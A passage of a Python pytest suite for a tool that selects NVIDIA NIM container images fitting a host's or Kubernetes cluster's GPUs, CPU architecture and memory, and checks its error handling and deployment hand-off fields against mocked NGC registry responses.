    code, payload, _ = run_select(
        tmp_path, select_routes({f"{LLAMA_ID}:2.0.13": failure}, LLAMA_ID)
    )
    assert code == 3
    assert (payload["state"], payload["errors"][0]["code"]) == ("no_metadata", "no_metadata")
    assert f"{LLAMA_ID}:2.0.13" in payload["errors"][0]["message"]
    [failed] = [i for i in payload["facts"]["images_considered"] if i["metadata"] == "error"]
    assert (failed["error_code"], "req-500" in failed["error"]) == ("metadata_service_error", True)


def test_select_limits_the_number_of_images(tmp_path: Path) -> None:
    code, payload, _ = run_select(
        tmp_path, select_routes({f"{LLAMA_ID}:2.1.4": FITS}), LLAMA_ID, "--max-images", "1"
    )
    assert code == 0, payload
    assert considered(payload) == [("2.1.4", "newest", "published", "fits")]
    [note] = [n for n in payload["facts"]["notes"] if n.startswith("Not checked")]
    assert "--max-images 1" in note
    assert f"nvcr.io/{LLAMA_ID}:2.0.13" in note and f"nvcr.io/{SPARK_ID}" in note
    code, payload, _ = run_select(tmp_path, {}, LLAMA_ID, "--max-images", "0")
    assert code == 2
    assert payload["errors"][0]["code"] == "bad_input"


def test_select_with_unknown_gpus_stops_before_ngc(tmp_path: Path) -> None:
    mig = h100_env(gpus_known=False, conditions=[{"code": "mig_enabled", "message": "MIG is on"}])
    code, payload, requested = run_select(tmp_path, select_routes({}), env=mig)
    assert code == 3
    assert payload["errors"][0]["code"] == "gpus_unknown"
    assert requested == []


def test_select_unreachable_ngc_is_an_external_failure(tmp_path: Path) -> None:
    env_file = write_env(tmp_path, h100_env())
    with serve({}) as server:
        dead = ngc_env(server)
    code, payload = run_cli("nimselect.py", "select", LLAMA_ID, "--env", str(env_file), env=dead)
    assert code == 4
    assert payload["errors"][0]["code"] == "ngc_unreachable"


def test_select_never_takes_another_model_with_the_same_name_prefix(tmp_path: Path) -> None:
    """deepseek-r1-distill-* and -0528 are other models: listed in notes, never checked."""
    base = "nim/deepseek-ai/deepseek-r1"
    others = [f"{base}-0528", f"{base}-distill-llama-70b"]
    repo = {"name": "deepseek-r1", "tags": ["1.7.3", "1.6.0"], "latestTag": "1.7.3"}
    routes: dict[str, Any] = {
        f"/v2/repos/{base}": (200, repo),
        f"/v2/repos/{base}/images": images_body({"1.7.3": BOTH, "1.6.0": BOTH}),
        SEARCH_PATH: (200, search_body(base, *others)),
        meta_key(base, "1.7.3"): OTHER_GPU,
        meta_key(base, "1.6.0"): OTHER_GPU,
        meta_key(others[1], "1.5.2"): FITS,
    }
    code, payload, requested = run_select(tmp_path, routes, "deepseek-ai/deepseek-r1")
    assert code == 0, payload
    facts = payload["facts"]
    assert payload["state"] == "does_not_fit"
    assert {i["resource_id"] for i in facts["images_considered"]} == {base}
    assert (facts["resource_id"], facts["image_choice"]["image"]) == (base, f"nvcr.io/{base}:1.7.3")
    assert not any("0528" in path or "distill" in path for path in requested)
    [note] = [n for n in facts["notes"] if "other models" in n]
    assert all(other in note for other in others)


def test_select_checks_the_cpu_architecture_of_every_image(tmp_path: Path) -> None:
    """arm64 host: an amd64-only older image is rejected, and one NGC does not list is unknown."""
    routes = select_routes(
        {f"{LLAMA_ID}:2.1.4": OTHER_GPU, f"{LLAMA_ID}:2.0.13": FITS, f"{LLAMA_ID}:1.15.5": FITS},
        LLAMA_ID,
    )
    routes[f"/v2/repos/{LLAMA_ID}/images"] = images_body({"2.1.4": BOTH, "2.0.13": ["amd64"]})
    code, payload, _ = run_select(tmp_path, routes, env=h100_env(arch="arm64"))
    assert code == 0, payload
    assert considered(payload) == [
        ("2.1.4", "newest", "published", "does_not_fit"),
        ("2.0.13", "older", "published", "does_not_fit"),
        ("1.15.5", "older", "published", "unknown"),
    ]
    assert payload["facts"]["images_considered"][1]["rejected_counts"] == {
        "cpu_arch_unsupported": 1
    }
    facts = payload["facts"]
    assert (payload["state"], payload["next"], facts["tag"]) == ("unknown", "ask_user", "1.15.5")
    assert "arch_not_recorded" in facts["best_unconfirmed"]["reasons"]
    assert facts["handoff"]["verdict"] == "unknown"
    assert facts["handoff"]["image"] == f"nvcr.io/{LLAMA_ID}:1.15.5"
    # a tag the user named is checked the same way
    code, payload, _ = run_select(
        tmp_path, routes, LLAMA_ID, "--tag", "2.0.13", env=h100_env(arch="arm64")
    )
    assert code == 0, payload
    assert considered(payload) == [("2.0.13", "requested", "published", "does_not_fit")]
    code, payload, _ = run_select(tmp_path, routes, LLAMA_ID, "--tag", "2.0.13")
    assert considered(payload) == [("2.0.13", "requested", "published", "fits")]


def test_select_with_architectures_only_of_another_build_is_unknown(tmp_path: Path) -> None:
    """The record's amd64 is the RTX build's, and the image list of this gated repository answers
    403: the newest image's architectures are not recorded, so it is unknown, never fits."""
    forbidden = (403, {"requestStatus": {"statusCode": "FORBIDDEN", "requestId": "req-403"}})
    routes = {
        f"/v2/repos/{DISTILL_ID}": (200, DISTILL_REPO),
        f"/v2/repos/{DISTILL_ID}/images": forbidden,
        SEARCH_PATH: (200, search_body(DISTILL_ID)),
        meta_key(DISTILL_ID, "1.5.2"): FITS,
    }
    code, payload, _ = run_select(tmp_path, routes, DISTILL_ID)
    assert code == 0, payload
    facts = payload["facts"]
    assert considered(payload) == [("1.5.2", "newest", "published", "unknown")]
    assert (payload["state"], facts["best_unconfirmed"]["reasons"]) == (
        "unknown",
        ["arch_not_recorded"],
    )
    assert any("architectures of the" in n and "req-403" in n for n in facts["notes"])


def test_select_keeps_what_was_checked_when_ngc_goes_away(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    calls: list[str] = []

    def metadata(resource_id: str, tag: str) -> dict[str, Any] | None:
        calls.append(tag)
        if len(calls) > 1:
            raise ns.ScriptError("ngc_unreachable", "NGC went away", "Retry", ns.EXIT_EXTERNAL)
        return OTHER_GPU[1]

    monkeypatch.setattr(ngc_api, "get_metadata", metadata)
    env_file = write_env(tmp_path, h100_env())
    with serve(select_routes({}, LLAMA_ID)) as server:
        set_ngc_base(monkeypatch, server.base)
        with pytest.raises(SystemExit) as stop:
            nimselect.main(["select", LLAMA_ID, "--env", str(env_file)])
    assert stop.value.code == 4
    payload = json.loads(capsys.readouterr().out)
    assert payload["errors"][0]["code"] == "ngc_unreachable"
    assert considered(payload) == [("2.1.4", "newest", "published", "does_not_fit")]


# --- the GPUs a hand-off names ----------------------------------------------------------------


def inspect_host_file(tmp_path: Path, smi_csv: str) -> Path:
    env_file = tmp_path / "inspected.json"
    code, payload = run_cli(
        "nimselect.py",
        "inspect",
        "--cache-dir",
        str(tmp_path),
        "--out",
        str(env_file),
        env=host_tools(tmp_path, smi_csv),
    )
    assert code == 0, payload
    return env_file


def fit_profiles(tmp_path: Path, env_file: Path, *profiles: dict[str, Any]) -> dict[str, Any]:
    """fit llama 2.1.4 with these profiles as its --metadata-file; return the payload."""
    meta_file = tmp_path / "metadata.json"
    meta_file.write_text(json.dumps({"profiles": list(profiles)}), encoding="utf-8")
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            LLAMA_ID,
            "--tag",
            "2.1.4",
            "--env",
            str(env_file),
            "--metadata-file",
            str(meta_file),
            env=ngc_env(server),
        )
    assert code == 0, payload
    return payload


def test_handoff_names_idle_gpus_and_skips_a_busy_one(tmp_path: Path) -> None:
    """GPU 3 has 47 GB in use: a TP4 profile gets GPUs 0, 1, 2 and 4, never 0-3."""
    env_file = inspect_host_file(tmp_path, "nvidia-smi-busy.csv")
    payload = fit_profiles(tmp_path, env_file, profile("tp4", tp=4))
    handoff = payload["facts"]["handoff"]
    assert (handoff["gpus"], handoff["gpu_ids"], handoff["gpu_count"]) == (
        "device=0,1,2,4",
        [0, 1, 2, 4],
        4,
    )
    [group] = payload["facts"]["environment_summary"]["groups"]
    assert group["idle_indices"] == [0, 1, 2, 4, 5, 6, 7]


def test_handoff_names_the_gpus_of_the_chosen_type_on_a_mixed_host(tmp_path: Path) -> None:
    """GPUs 0-1 are H100 NVL and GPU 2 an L40S: an L40S-only profile gets GPU 2. A count of 1
    would start it on GPU 0, an H100 NVL."""
    env_file = inspect_host_file(tmp_path, "nvidia-smi-mixed.csv")
    payload = fit_profiles(tmp_path, env_file, profile("l40s-only", pci="26b9:10de"))
    handoff = payload["facts"]["handoff"]
    assert (handoff["gpus"], handoff["gpu_ids"], handoff["gpu_name"]) == (
        "device=2",
        [2],
        "NVIDIA L40S",
    )


def inspect_k8s_file(tmp_path: Path, nodes: Path | None = None) -> Path:
    """inspect --target k8s of the fake kubectl's nodes (kube_tools); the env.json it saved."""
    env_file = tmp_path / "k8s.json"
    code, payload = run_cli(
        "nimselect.py",
        "inspect",
        "--target",
        "k8s",
        "--context",
        "default",
        "--namespace",
        "nim",
        "--out",
        str(env_file),
        env=kube_tools(tmp_path, nodes),
    )
    assert code == 0, payload
    return env_file


def test_handoff_on_kubernetes_is_a_gpu_count(tmp_path: Path) -> None:
    env_file = inspect_k8s_file(tmp_path)
    handoff = fit_profiles(tmp_path, env_file, profile("tp2", tp=2))["facts"]["handoff"]
    assert (handoff["gpus"], handoff["gpu_ids"], handoff["gpu_count"]) == (2, None, 2)
    # the profile records no CPU or memory need: nothing to request, nothing to place
    assert (handoff["cpu"], handoff["memory"], handoff["placement"]) == (None, None, None)


def test_review_kubernetes_handoff_identifies_selected_gpu_memory(
    tmp_path: Path,
) -> None:
    env_file = inspect_k8s_file(tmp_path)
    payload = fit_profiles(tmp_path, env_file, profile("tp2", tp=2))
    assert payload["facts"]["handoff"]["gpu_memory_mib"] == payload["facts"]["group"]["memory_mib"]


@pytest.mark.parametrize("hostname_fallback", [False, True])
def test_serialized_selection_transfers_selected_gpu_placement_to_deployment(
    tmp_path: Path, hostname_fallback: bool
) -> None:
    env_file = inspect_k8s_file(tmp_path)
    environment = json.loads(env_file.read_text())
    [selected] = environment["groups"]
    if hostname_fallback:
        selected["placement"] = {
            "selector": None,
            "hostnames": ["worker-a"],
            "nodes_matched": ["node-a"],
            "source": "hostname-fallback",
        }
    other = {
        **selected,
        "memory_mib": 1,
        "memory_gb": 0.001,
        "placement": {"selector": {"pool": "wrong"}, "nodes_matched": ["other"]},
    }
    environment["groups"] = [other, selected]
    env_file.write_text(json.dumps(environment))
    payload = fit_profiles(tmp_path, env_file, profile("tp2", tp=2))
    assert payload["facts"]["handoff"]["gpu_memory_mib"] == selected["memory_mib"]
    assert [
        group.get("memory_mib") for group in payload["facts"]["environment_summary"]["groups"]
    ] == [1, selected["memory_mib"]]
    select_file = tmp_path / "select.json"
    select_file.write_text(json.dumps(payload["facts"]))
    deploy_script = SCRIPTS.parent.parent / "nim-deploy" / "scripts" / "nimdeploy.py"
    code, deployment = run_cli(
        str(deploy_script),
        "new",
        "--target",
        "helm",
        "--from",
        str(select_file),
        "--set",
        "name=selected",
        "--set",
        "ngc_secret=ngc",
        env={"NIM_DEPLOY_HOME": str(tmp_path / "deploy")},
        direct=True,
    )
    assert code == 0, deployment
    assert "placement" not in deployment["facts"]["missing"]
    inputs = deployment["facts"]["inputs"]
    if hostname_fallback:
        assert inputs["node_hostnames"] == selected["placement"]["hostnames"]
    else:
        assert inputs["node_selector"] == selected["placement"]["selector"]
    assert inputs["placement_nodes"] == selected["placement"]["nodes_matched"]


def test_shared_memory_placement_survives_the_saved_deployment_handoff(
    tmp_path: Path,
) -> None:
    nodes = tmp_path / "nodes.json"
    nodes.write_text(json.dumps(fixture_json("env", "kubectl-nodes-gb10.json")))
    env_file = inspect_k8s_file(tmp_path, nodes)
    facts = fit_profiles(tmp_path, env_file, profile("shared", pci="2e12:10de"))[
        "facts"
    ]
    select_file = tmp_path / "select.json"
    select_file.write_text(json.dumps(facts))
    deploy_script = SCRIPTS.parent.parent / "nim-deploy" / "scripts" / "nimdeploy.py"
    code, deployment = run_cli(
        str(deploy_script),
        "new",
        "--target",
        "helm",
        "--from",
        str(select_file),
        "--set",
        "name=shared",
        "--set",
        "ngc_secret=ngc",
        env={"NIM_DEPLOY_HOME": str(tmp_path / "deploy")},
        direct=True,
    )
    assert code == 0, deployment
    assert "placement" not in deployment["facts"]["missing"]
    assert deployment["facts"]["inputs"]["node_selector"] == {
        "nvidia.com/gpu.product": "NVIDIA-GB10"
    }
    # Shared node memory is not a dedicated-GPU memory label to compare live.
    assert "placement_gpu_memory_mib" not in deployment["facts"]["inputs"]


def two_node_fit(
    tmp_path: Path,
    needs: dict[str, Any],
    small: dict[str, str],
    labels: dict[str, str] | None = None,
) -> dict[str, Any]:
    """The reported cluster, through the real inspect and fit: two copies of the k3s fixture node,
    `large` with 16 CPUs and 128 GB, and `small` with the allocatable values `small` (cpu,
    memory, nvidia.com/gpu) and the labels `labels`. The profile `needs` fits; fit's facts."""
    node = fixture_json("env", "kubectl-nodes-h100nvl.json")["items"][0]
    items = []
    for name, allocatable, own_labels in (
        ("large", {"cpu": "16", "memory": "125000000Ki"}, {}),
        ("small", small, labels or {}),
    ):
        item = json.loads(json.dumps(node))
        item["metadata"]["name"] = name
        item["metadata"]["labels"].update(own_labels)
        item["status"]["allocatable"].update(allocatable)
        items.append(item)
    nodes = tmp_path / "nodes.json"
    nodes.write_text(json.dumps({"items": items}), encoding="utf-8")
    facts = fit_profiles(tmp_path, inspect_k8s_file(tmp_path, nodes), needs)["facts"]
    assert facts["verdict"] == "fits"
    return dict(facts)


PLACEMENT_8_CPUS_64_GB = (
    "Not every GPU node the pod can be placed on is known to have 8 CPU cores and 64 GB of host "
    "memory: a pod that requests only GPUs can be placed on any node with enough free GPUs. The "
    "deployment must request them or be pinned to a node that has them. Confirm with the user how "
    "it is placed before the hand-off."
)


def test_a_kubernetes_handoff_carries_the_cpus_and_memory_the_profile_needs(
    tmp_path: Path,
) -> None:
    """The reported case: two H100 NVL nodes, one with 16 CPUs and 128 GB, one with 4 CPUs and
    32 GB. A profile that needs 8 CPUs and 64 GB fits on the larger, but the hand-off gave only
    the GPU count, and a pod that requests only GPUs can be placed on the smaller. The hand-off
    carries the CPUs and memory as the pod's requests now, and says that placement needs the
    user's confirmation; when every node has them, it says nothing. A host hand-off is as
    before."""
    needs = {**profile("p8"), "min_cpu_count": 8, "system_memory_per_device_gb": 64.0}
    small = {"cpu": "4", "memory": "31250000Ki"}  # 32 GB
    handoff = two_node_fit(tmp_path, needs, small)["handoff"]
    assert (handoff["gpus"], handoff["cpu"], handoff["memory"]) == (1, 8, "64G")
    assert handoff["placement"] == PLACEMENT_8_CPUS_64_GB
    roomy = {"cpu": "12", "memory": "93750000Ki"}  # 96 GB: every node has room
    handoff = two_node_fit(tmp_path, needs, roomy)["handoff"]
    assert (handoff["cpu"], handoff["memory"], handoff["placement"]) == (8, "64G", None)
    host = fit_profiles(tmp_path, write_env(tmp_path, h100_env()), needs)["facts"]["handoff"]
    assert not {"cpu", "memory", "placement"} & set(host)


@pytest.mark.parametrize(
    ("gpus", "driver", "tp", "placement"),
    [
        ("4", "580.126.09", 1, PLACEMENT_8_CPUS_64_GB),
        ("8", "580.95.05", 1, PLACEMENT_8_CPUS_64_GB),
        ("1", "580.126.09", 2, None),
    ],
    ids=["fewer-gpus", "another-driver", "fewer-gpus-than-the-pod-requests"],
)
def test_placement_is_judged_on_every_gpu_node_the_pod_can_be_placed_on(
    tmp_path: Path, gpus: str, driver: str, tp: int, placement: str | None
) -> None:
    """The reported case with the small node (4 CPUs, 32 GB) in a GPU group of its own: the same
    GPU, but fewer GPUs or another driver. The profile fits on the large node's group, but a pod
    that requests only GPUs and names no node can be placed on the small node too, so placement
    needs confirmation as when the two nodes are one group. A node with fewer GPUs than the pod
    requests cannot take it: a TP2 profile says nothing of a one-GPU node."""
    needs = {**profile("p", tp=tp), "min_cpu_count": 8, "system_memory_per_device_gb": 64.0 / tp}
    small = {"cpu": "4", "memory": "31250000Ki", "nvidia.com/gpu": gpus}
    labels = {"nvidia.com/cuda.driver-version.full": driver}
    facts = two_node_fit(tmp_path, needs, small, labels)
    assert len(facts["groups"]) == 2
    handoff = facts["handoff"]
    assert (handoff["gpus"], handoff["cpu"], handoff["memory"]) == (tp, 8, "64G")
    assert handoff["placement"] == placement


def test_a_kubernetes_handoff_from_an_older_environment_file_uses_the_cluster_values() -> None:
    """A group saved before it had its smallest CPU count and memory: the smallest of the
    cluster's GPU nodes, which are no larger, say whether every node has room. Memory is per GPU
    times the GPUs, in decimal GB."""
    record = {"min_cpu_count": None, "system_memory_per_device_gb": 32.5, "gpus_required": 2}
    groups = [{"name": "NVIDIA-H100-NVL", "count": 8}]
    roomy = {"target": "k8s", "groups": groups, "cpu_count": 4, "memory_gb": 65.0}
    assert nimselect.handoff_resources(record, roomy) == {
        "cpu": None,
        "memory": "65G",
        "placement": None,
    }
    small = nimselect.handoff_resources(record, {**roomy, "memory_gb": 64.99})["placement"]
    assert small.startswith(
        "Not every GPU node the pod can be placed on is known to have 65 GB of host memory:"
    )


def test_handoff_without_idle_indices(tmp_path: Path) -> None:
    host = {"target": "host"}
    all_idle = {"count": 8, "idle": 8, "indices": list(range(8))}
    assert nimselect.handoff_gpus(all_idle, 2, host) == {
        "gpus": "device=0,1",
        "gpu_ids": [0, 1],
        "gpu_count": 2,
    }
    one_busy = {"count": 8, "idle": 7, "indices": list(range(8))}
    assert nimselect.handoff_gpus(one_busy, 2, host) == {
        "gpus": None,
        "gpu_ids": None,
        "gpu_count": 2,
    }
    env = h100_env()
    env["groups"][0].update(idle=7)
    del env["groups"][0]["idle_indices"]
    facts = fit_profiles(tmp_path, write_env(tmp_path, env), profile("tp1"))["facts"]
    assert facts["handoff"]["gpus"] is None
    assert any("Which GPUs are idle is not recorded" in w for w in facts["warnings"])


def test_handoff_asks_which_gpus_when_too_few_are_known_to_be_idle(tmp_path: Path) -> None:
    """6 of 8 GPUs are idle and the memory use of 2 is unknown: a TP8 profile is unknown
    (gpu_use_unknown) and the hand-off names no GPUs. The idle GPUs are recorded, so the warning
    says too few are known to be idle, not that the idle ones are not recorded."""
    env = h100_env()
    env["groups"][0].update(idle=6, idle_indices=list(range(6)), unknown_use=2)
    facts = fit_profiles(tmp_path, write_env(tmp_path, env), profile("tp8", tp=8))["facts"]
    assert "gpu_use_unknown" in facts["best_unconfirmed"]["reasons"]
    handoff = facts["handoff"]
    assert (handoff["gpus"], handoff["gpu_ids"], handoff["gpu_count"]) == (None, None, 8)
    assert (
        "Fewer GPUs are known to be idle than the profile needs; ask the user which GPUs of "
        "NVIDIA H100 NVL to use before the hand-off."
    ) in facts["warnings"]
    assert not any("not recorded" in warning for warning in facts["warnings"])


def test_fit_checks_the_cpu_architecture_of_an_older_tag(tmp_path: Path) -> None:
    """NGC's repository records the architectures of latestTag's image only: fit reads the tag's
    own from the image list, and an image no source records stays unknown."""
    routes = {**repo_routes(), f"/v2/repos/{LLAMA_ID}/images": images_body({"2.0.13": ["amd64"]})}
    meta_file = tmp_path / "metadata.json"
    meta_file.write_text(json.dumps({"profiles": [profile("fits-here")]}), encoding="utf-8")

    def fit_on(arch: str, tag: str) -> dict[str, Any]:
        env_file = write_env(tmp_path, h100_env(arch=arch))
        with serve(routes) as server:
            code, payload = run_cli(
                "nimselect.py",
                "fit",
                LLAMA_ID,
                "--tag",
                tag,
                "--env",
                str(env_file),
                "--metadata-file",
                str(meta_file),
                env=ngc_env(server),
            )
        assert code == 0, payload
        return payload

    arm = fit_on("arm64", "2.0.13")
    assert arm["state"] == "does_not_fit"
    assert arm["facts"]["rejected"]["counts"] == {"cpu_arch_unsupported": 1}
    assert fit_on("amd64", "2.0.13")["state"] == "fits"
    unlisted = fit_on("amd64", "1.15.5")
    assert unlisted["state"] == "unknown"
    assert unlisted["facts"]["best_unconfirmed"]["reasons"] == ["arch_not_recorded"]


def test_an_html_proxy_page_is_an_error_not_an_empty_answer(tmp_path: Path) -> None:
    """A proxy that answers 200 with an HTML page: fit and select fail with exit 4, never
    does_not_fit with no profiles."""
    page = "<html><body>Sign in to the proxy</body></html>"
    env_file = write_env(tmp_path, h100_env())
    with serve({REPO_PATH: (200, page), METADATA_PATH: (200, page)}) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            LLAMA_ID,
            "--tag",
            "2.1.4",
            "--env",
            str(env_file),
            env=ngc_env(server),
        )
    assert code == 4, payload
    assert (payload["ok"], payload["next"]) == (False, "fix_errors")
    assert payload["errors"][0]["code"] == "ngc_bad_response"
    # Only the metadata answers are proxy pages: select records each and fails with that code.
    code, payload, _ = run_select(tmp_path, {**select_routes({}), METADATA_PATH: (200, page)})
    assert code == 4, payload
    assert payload["errors"][0]["code"] == "ngc_bad_response"
    assert payload["errors"][0]["fix"] == ngc_api.BAD_RESPONSE_FIX
    errors = {item["error_code"] for item in payload["facts"]["images_considered"]}
    assert errors == {"ngc_bad_response"}


# --- a NIM whose metadata lists no profile ------------------------------------------------------


@pytest.mark.parametrize("body", [{"profiles": []}, {"profiles": ["x", 1]}])
def test_fit_with_no_profiles_is_no_metadata_never_does_not_fit(
    tmp_path: Path, body: dict[str, Any]
) -> None:
    env_file = write_env(tmp_path, h100_env())
    with serve({**repo_routes(), METADATA_PATH: (200, body)}) as server:
        code, payload = run_cli(
            "nimselect.py", "fit", LLAMA_ID, "--tag", "2.1.4", "--env", str(env_file),
            env=ngc_env(server),
        )  # fmt: skip
    assert code == 3, payload
    assert (payload["state"], payload["next"]) == ("no_metadata", "ask_user")
    error = payload["errors"][0]
    assert error["code"] == "no_metadata"
    assert error["message"] == (
        "the NIM Metadata API has no profiles for nvcr.io/nim/meta/llama-3.1-8b-instruct:2.1.4"
    )
    assert "list-model-profiles" in error["fix"]
    assert payload["facts"]["tags_to_try"]
    assert "handoff" not in payload["facts"]


def test_fit_with_a_metadata_file_that_lists_no_profiles(tmp_path: Path) -> None:
    env_file = write_env(tmp_path, h100_env())
    empty = tmp_path / "empty.json"
    empty.write_text(json.dumps({"profiles": []}), encoding="utf-8")
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py", "fit", LLAMA_ID, "--tag", "2.1.4", "--env", str(env_file),
            "--metadata-file", str(empty), env=ngc_env(server),
        )  # fmt: skip
    assert code == 3, payload
    assert payload["errors"][0]["code"] == "no_metadata"
    assert payload["errors"][0]["message"].startswith(f"{empty} lists no profiles for ")


def test_select_skips_an_image_whose_metadata_lists_no_profiles(tmp_path: Path) -> None:
    empty: tuple[int, dict[str, Any]] = (200, {"profiles": []})
    routes = select_routes({f"{LLAMA_ID}:2.1.4": empty, f"{LLAMA_ID}:2.0.13": FITS})
    code, payload, _ = run_select(tmp_path, routes)
    assert code == 0, payload
    assert considered(payload)[:3] == [
        ("2.1.4", "newest", "not_published", None),
        ("1.0.0-variant", "variant", "not_published", None),
        ("2.0.13", "older", "published", "fits"),
    ]
    facts = payload["facts"]
    assert (payload["state"], facts["tag"], facts["image_choice"]["kind"]) == (
        "fits",
        "2.0.13",
        "older",
    )
    assert "2.1.4: no published profiles" in facts["image_choice"]["reason"]
    # No image lists a profile: no_metadata (exit 3), never does_not_fit.
    code, payload, _ = run_select(tmp_path, {**select_routes({}), METADATA_PATH: empty})
    assert code == 3, payload
    assert payload["errors"][0]["code"] == "no_metadata"
    assert all(item["verdict"] is None for item in payload["facts"]["images_considered"])


# --- install folders -------------------------------------------------------------------------


@pytest.mark.parametrize(
    "location", [".agents/skills", ".claude/skills", "home/.claude/skills", "my skills/with space"]
)
def test_scripts_run_from_any_install_folder(tmp_path: Path, location: str) -> None:
    """SKILL.md runs python3 -I "<SKILL_DIR>/scripts/nimselect.py" from the project folder: it
    works wherever the skill is installed, with neither the script's folder nor PYTHONPATH on
    sys.path. Only PATH reaches this direct run (a TEST_* hook needs run_cli's runner)."""
    scripts = tmp_path / location / "nim-select" / "scripts"
    shutil.copytree(SCRIPTS, scripts, ignore=shutil.ignore_patterns("__pycache__"))
    project = tmp_path / "project dir"
    project.mkdir()
    env_file = project / "env.json"
    proc = subprocess.run(
        [sys.executable, "-I", str(scripts / "nimselect.py"), "inspect", "--out", str(env_file),
         "--cache-dir", str(project)],
        cwd=project,
        env={**os.environ, "PATH": host_tools(tmp_path)["PATH"]},
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=120,
        check=False,
    )  # fmt: skip
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert json.loads(proc.stdout)["state"] == "inspected"
    assert json.loads(env_file.read_text(encoding="utf-8"))["groups"][0]["count"] == 8


# --- moving aliases, image lists and the hand-off ----------------------------------------------

QWEN35_ID = "nim/qwen/qwen3.5-35b-a3b"
QWEN35_TAGS = ["latest", "1.7.0-variant", "1.7", "1"]
QWEN_NEXT_ID = "nim/qwen/qwen3-next-80b-a3b-instruct"
QWEN_NEXT_TAGS = ["1.5.0-variant", "1.5", "1.0", "1", "1.0.0-variant", "latest"]
FORBIDDEN = (403, {"requestStatus": {"statusCode": "FORBIDDEN", "requestId": "req-403"}})


def same_image(tags: list[str], digest: str = "sha256:ce44d061582b") -> tuple[int, dict[str, Any]]:
    """An image list in which every tag is one image (nim/qwen/qwen3.5-35b-a3b on 2026-11-04)."""
    variants = [{"os": "linux", "architecture": a} for a in BOTH]
    images = [{"tag": t, "digest": digest, "architectureVariants": variants} for t in tags]
    return 200, {"images": images}


@pytest.mark.parametrize(
    ("tags", "current", "digests", "expected"),
    [
        (QWEN35_TAGS, "1.7.0-variant", None, []),
        (QWEN_NEXT_TAGS, "1.5.0-variant", None, ["1.0.0-variant"]),
        (["1.2.0", "1.1", "1.0.0-rc1", "1.0.0"], "1.2.0", None, ["1.1", "1.0.0"]),
        (
            ["1", "1.1", "latest", "1.10.0"],
            "1.10.0",
            dict.fromkeys(["1", "1.1", "1.10.0"], "d"),
            [],
        ),
        (
            ["2.0.0", "1.9", "1.9.0-rc1", "1.8.0", "latest"],
            "2.0.0",
            {"1.9": "d", "1.9.0-rc1": "d"},
            ["1.8.0"],
        ),
        (["2.0.0-rc1", "2.0", "1.9.0"], "2.0.0-rc1", None, ["1.9.0"]),
    ],
    ids=[
        "qwen3.5-35b-a3b",
        "qwen3-next-80b-a3b-instruct",
        "alias-without-build",
        "rerank-500m",
        "alias-of-a-prerelease",
        "alias-of-a-prerelease-without-metadata",
    ],
)
def test_tags_to_try_are_other_builds(
    tags: list[str], current: str, digests: dict[str, str] | None, expected: list[str]
) -> None:
    """Never an alias of the image that has no metadata; other aliases as the build they stand
    for; suffixed builds kept, prereleases left out."""
    assert nimselect.tags_to_try({"tags": tags}, current, digests) == expected


def test_resolve_takes_the_build_the_moving_aliases_point_to() -> None:
    """nim/nvidia/nemotron-3-super-120b-a12b-experimental: `1.8`, `1` and `latest` are the
    1.8.3-variant image; the plain 1.8.1 is an older build."""
    rid = "nim/nvidia/nemotron-3-super-120b-a12b-experimental"
    tags = ["1.8.3-variant", "1.8.2-variant", "1.8", "1", "1.8.1-variant", "1.8.1", "latest"]
    repo = {"name": rid.rsplit("/", 1)[-1], "tags": tags, "latestTag": "latest"}
    newest = ("latest", "1", "1.8", "1.8.3-variant")
    images = same_image(list(newest), "sha256:e8355971fc7e")[1]["images"]
    images += same_image(["1.8.1", "1.8.1-variant"], "sha256:a7e96e45d2ad")[1]["images"]
    routes = {f"/v2/repos/{rid}": (200, repo), f"/v2/repos/{rid}/images": (200, {"images": images})}
    with serve(routes) as server:
        code, payload = run_cli("nimselect.py", "resolve", rid, env=ngc_env(server))
    assert code == 0, payload
    assert (payload["facts"]["tag"], payload["facts"]["tag_source"]) == (
        "1.8.3-variant",
        "newest_version",
    )


@pytest.mark.parametrize("args", [["--tag", "1.7"], []])
def test_select_replaces_a_requested_moving_alias_with_its_build(
    tmp_path: Path, args: list[str]
) -> None:
    model = QWEN35_ID if args else f"nvcr.io/{QWEN35_ID}:1"
    routes = {
        f"/v2/repos/{QWEN35_ID}": (200, {"name": "qwen3.5-35b-a3b", "tags": QWEN35_TAGS}),
        f"/v2/repos/{QWEN35_ID}/images": same_image(QWEN35_TAGS),
        meta_key(QWEN35_ID, "1.7.0-variant"): FITS,
    }
    code, payload, requested = run_select(tmp_path, routes, model, *args)
    assert code == 0, payload
    facts = payload["facts"]
    assert considered(payload) == [("1.7.0-variant", "requested", "published", "fits")]
    assert facts["handoff"]["image"] == f"nvcr.io/{QWEN35_ID}:1.7.0-variant"
    assert any("is a moving tag" in n and "the same image digest" in n for n in facts["notes"])
    # no other version is listed, so no other image lends its test records
    metadata = [path for path in requested if path.startswith(METADATA_PATH)]
    assert metadata == [meta_key(QWEN35_ID, "1.7.0-variant")]


def test_select_falls_back_to_the_older_build_not_its_alias(tmp_path: Path) -> None:
    """nim/qwen/qwen3-next-80b-a3b-instruct: the older line is 1.0.0-variant, never the moving
    alias 1.0. Its image list is not public, so the older image's CPU architectures are unknown."""
    repo = {
        "name": "qwen3-next-80b-a3b-instruct",
        "tags": QWEN_NEXT_TAGS,
        "latestTag": "1.5.0-variant",
        "latestArchitectureVariants": [{"os": "linux", "architecture": "amd64"}],
    }
    routes = {
        f"/v2/repos/{QWEN_NEXT_ID}": (200, repo),
        f"/v2/repos/{QWEN_NEXT_ID}/images": FORBIDDEN,
        SEARCH_PATH: (200, search_body(QWEN_NEXT_ID)),
        meta_key(QWEN_NEXT_ID, "1.5.0-variant"): TOO_BIG,
        meta_key(QWEN_NEXT_ID, "1.0.0-variant"): FITS,
    }
    code, payload, _ = run_select(tmp_path, routes, QWEN_NEXT_ID)
    assert code == 0, payload
    assert considered(payload) == [
        ("1.5.0-variant", "newest", "published", "does_not_fit"),
        ("1.0.0-variant", "older", "published", "unknown"),
    ]
    facts = payload["facts"]
    assert facts["handoff"]["image"] == f"nvcr.io/{QWEN_NEXT_ID}:1.0.0-variant"
    assert facts["best_unconfirmed"]["reasons"] == ["arch_not_recorded"]
    assert sum("req-403" in note for note in facts["notes"]) == 1


